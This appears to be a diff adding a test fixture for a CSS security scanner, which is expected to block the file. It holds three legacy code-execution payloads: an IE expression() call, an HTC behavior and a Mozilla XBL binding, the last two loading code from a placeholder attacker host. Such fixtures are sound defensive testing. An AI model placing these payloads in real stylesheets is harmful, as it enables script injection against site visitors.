@@ -1,0 +1,20 @@
+/*
+ * Malicious Test CSS: Dynamic Expression & Behavior Attachment
+ * Attack Vector: Uses IE CSS expression() or HTC behavior to execute arbitrary code
+ * Expected Result: BLOCKED (Critical Severity: xss-dynamic-expression & remote-behavior-binding)
+ */
+
+.card-container {
+  /* Dynamic expression evaluation */
+  width: expression(alert('CSS_EXPRESSION_EXECUTION'));
+}
+
+.legacy-box {
+  /* HTC behavior attachment */
+  behavior: url("https://attacker.evil/evil.htc");
+}
+
+.moz-box {
+  /* Mozilla XBL binding attachment */
+  -moz-binding: url("https://attacker.evil/binding.xml#attack");
+}
